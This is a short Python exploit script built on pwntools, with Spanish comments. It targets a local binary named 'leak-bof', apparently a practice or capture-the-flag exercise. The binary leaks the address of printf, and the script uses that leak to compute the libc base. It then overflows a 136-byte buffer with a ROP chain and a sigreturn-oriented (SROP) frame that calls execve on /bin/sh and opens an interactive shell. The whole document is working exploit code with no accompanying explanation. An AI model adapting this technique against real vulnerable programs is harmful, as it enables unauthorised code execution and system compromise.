#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux');
elf = ELF("./leak-bof")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
p = process("./leak-bof")

l = log.progress("Calculando libc base address")
p.readuntil(b"I'm leaking printf: ")
libc.address = int(p.readline(), 16) - libc.sym['printf']
l.success(f"0x{libc.address:x}")
rop = ROP(libc.file.name)

l = log.progress("Stage 2")
bin_sh = next(libc.search(b'/bin/sh'))
syscall = libc.address + rop.syscall.address

rop.raw(libc.address + rop.find_gadget(['pop rax', 'ret']).address)
rop.raw(constants.SYS_rt_sigreturn)
rop.raw(syscall)

#Construyendo SROP frame

frame = SigreturnFrame(kernel="amd64", arch="amd64")
frame.rax = constants.SYS_execve
frame.rdi = bin_sh
#registros rsi y rdx tienen que ser nulos
frame.rsi = 0
frame.rdx = 0
frame.rsp = bin_sh
frame.rip = syscall

p.sendlineafter(b": ", b"A"*136 + rop.chain() + bytes(frame))
l.success(':D')
p.interactive()
